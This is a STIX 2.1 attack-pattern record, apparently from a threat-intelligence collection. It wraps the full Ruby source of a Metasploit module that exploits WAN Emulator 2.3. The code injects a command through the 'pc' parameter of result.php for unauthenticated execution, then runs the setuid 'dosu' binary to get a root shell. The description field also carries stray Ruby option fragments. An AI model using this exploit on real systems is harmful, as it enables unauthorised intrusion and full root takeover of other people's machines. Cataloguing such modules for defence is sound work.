{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42e032fb-cf8b-4012-b5df-c320f49e0db9",
    "created": "2024-08-14T17:02:58.794298Z",
    "modified": "2024-08-14T17:02:58.794302Z",
    "name": "WAN Emulator v2.3 Command Execution",
    "description": " This module exploits a command execution vulnerability in WAN Emulator version 2.3 which can be abused to allow unauthenticated users to execute arbitrary commands under the context of the 'www-data' user. The 'result.php' script calls shell_exec() with user controlled data from the 'pc' parameter. This module also exploits a command execution vulnerability to gain root privileges. The 'dosu' binary is suid 'root' and vulnerable to command execution in argument one.  'License'        => MSF_LICENSE 'Privileged'     => true 'Platform'       => 'unix' 'Arch'           => ARCH_CMD",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/wanem_exec.rb",
            "external_id": "wanem_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WAN Emulator v2.3 Command Execution',\n      'Description'    => %q{\n        This module exploits a command execution vulnerability in WAN Emulator\n        version 2.3 which can be abused to allow unauthenticated users to execute\n        arbitrary commands under the context of the 'www-data' user.\n        The 'result.php' script calls shell_exec() with user controlled data\n        from the 'pc' parameter. This module also exploits a command execution\n        vulnerability to gain root privileges. The 'dosu' binary is suid 'root'\n        and vulnerable to command execution in argument one.\n      },\n      'License'        => MSF_LICENSE,\n      'Privileged'     => true,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Author'         =>\n        [\n          'bcoles', # Discovery and exploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '85344'],\n          ['OSVDB', '85345']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => \"\\x00\\x22\\x27\",\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat netcat-e',\n            }\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-08-12'\n    ))\n  end\n\n  def on_new_session(client)\n    client.shell_command_token(\"/UNIONFS/home/perc/dosu /bin/sh\")\n  end\n\n  def check\n    fingerprint = Rex::Text.rand_text_alphanumeric(rand(8)+4)\n    data  = \"pc=127.0.0.1; \"\n    data << Rex::Text.uri_encode(\"echo #{fingerprint}\")\n    data << \"%26\"\n    vprint_status(\"Sending check\")\n\n    begin\n      res = send_request_cgi({\n        'uri'    => '/WANem/result.php',\n        'method' => 'POST',\n        'data'   => data\n      }, 25)\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res and res.code == 200 and res.body =~ /#{fingerprint}/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    data  = \"pc=127.0.0.1; \"\n    data << Rex::Text.uri_encode(payload.raw)\n    data << \"%26\"\n    print_status(\"Sending payload (#{payload.raw.length} bytes)\")\n    begin\n      res = send_request_cgi({\n        'uri'    => '/WANem/result.php',\n        'method' => 'POST',\n        'data'   => data\n      }, 25)\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Connection failed\")\n    end\n    if res and res.code == 200\n      print_good(\"Payload sent successfully\")\n    else\n      print_error(\"Sending payload failed\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-12"
}